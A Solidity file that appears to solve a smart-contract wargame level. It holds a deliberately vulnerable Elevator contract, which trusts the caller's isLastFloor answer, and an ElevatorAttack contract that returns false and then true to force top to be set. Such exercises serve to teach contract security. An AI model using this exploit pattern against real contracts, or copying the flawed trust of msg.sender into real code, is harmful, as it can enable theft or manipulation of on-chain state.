// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
contract ElevatorAttack{
    // storage, persists throughout function calls
    uint256 timesCalled;
    Elevator elevator;

    constructor(address _elevator) public{
        elevator = Elevator(_elevator);
    }

    function attack() external payable {
        elevator.goTo(0);
    }

    function isLastFloor(uint256 /* floor */) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1) return true;
        else return false;
    }
}